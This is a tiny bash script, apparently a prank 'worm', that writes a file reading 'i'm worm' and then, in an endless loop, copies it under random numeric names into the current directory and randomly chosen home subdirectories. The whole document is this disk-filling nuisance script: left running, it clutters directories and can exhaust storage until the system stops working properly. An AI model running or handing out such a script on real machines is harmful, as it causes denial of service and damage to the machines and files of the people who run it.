#!/bin/bash

echo "i'm worm" > worm

while [ true ]; do
	cp worm $(ls -p $HOME | grep / | sort -R | head -n1)$RANDOM ; cp worm $RANDOM
done
